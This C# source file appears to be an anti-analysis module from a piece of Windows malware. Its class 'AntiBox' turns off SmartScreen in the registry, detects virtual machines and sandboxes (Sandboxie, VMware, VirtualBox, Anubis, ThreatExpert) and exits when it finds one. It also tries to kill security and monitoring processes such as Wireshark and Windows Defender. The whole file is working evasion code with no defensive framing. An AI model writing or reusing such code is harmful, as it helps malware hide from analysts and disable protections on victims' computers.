using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

internal class AntiBox
{
    static readonly string[] NS = new string[] { "wireshark", "MSASCui", "msmpeng"};
    public static bool DisableSmart()
    {
        RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", true);
        try
        {
            if (key.GetValue("SmartScreenEnabled") != null)
            {
                key.SetValue("SmartScreenEnabled", "Off");
            }
            key.Close();
            return true;
        }
        catch
        {
            return false;
        }
    }
    public static bool SBieDLL()
    {
        if (Process.GetProcessesByName("wsnm").Length <= 0 && AntiBox.GetModuleHandle("SbieDll.dll").ToInt32() == 0)
            return false;
        return true;
    }
    public static bool DetectVirtualMachine()
    {
        using (ManagementObjectSearcher mob = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
            using (ManagementObjectCollection ob = mob.Get())
            {
                foreach (ManagementBaseObject xa in ob)
                {
                    string str = xa["Manufacturer"].ToString().ToLower();
                    if (str == "microsoft corporation" && xa["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")
                        || str.Contains("vmware") || xa["Model"].ToString() == "VirtualBox")
                    {
                        return true;
                    }
                }
            }
        }
        return false;
    }
    public static void Detected()
    {
        Environment.Exit(0);
    }
    public static bool AntiSunbelt()
    {
        if (Directory.Exists(@"C:\analysis"))
            return true;
        return false;
    }
    public static bool AntiVirtualPC()
    {
        if (Process.GetProcessesByName("vpcmap").Length >= 4 & Process.GetProcessesByName("vmsrvc").Length >= 4)
        {
            return true;
        }
        if (Process.GetProcessesByName("vmusrvc").Length >= 4)
        {
            return true;
        }
        return false;
    }
    public static bool AntiSandboxie()
    {
        if (Process.GetProcessesByName("SbieSvc").Length >= 1 | Process.GetProcessesByName("sniff_hit").Length >= 1 |
            Process.GetProcessesByName("sysAnalyzer").Length >= 1)
            return true;
        return false;
    }
    public static void ProcKill()
    {
        if (prcIsRunning(NS.ToString()))
        {
            killProcess(NS.ToString());
        }
    }
    public static bool AntiAnubis()
    {
        string folder = Application.StartupPath;
        string getFile = folder + "\\sample.exe";
        if (Application.ExecutablePath == getFile)
            return true;
        return false;
    }
    public static bool AntiThreatExpert()
    {
        if (Process.GetCurrentProcess().MainModule.FileName.Contains("sample"))
            return true;
        return false;
    }
    public static bool prcIsRunning(string process)
    {
        foreach (Process p in Process.GetProcesses())
            if (p.ProcessName.Contains(process))
                return true;
        return false;
    }
    private static void killProcess(string process)
    {
        foreach (Process p in Process.GetProcesses())
            if (p.ProcessName.Contains(process))
                try
                {
                    p.Kill();
                } catch { }

    }
    #region DLL_Imports
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    #endregion
}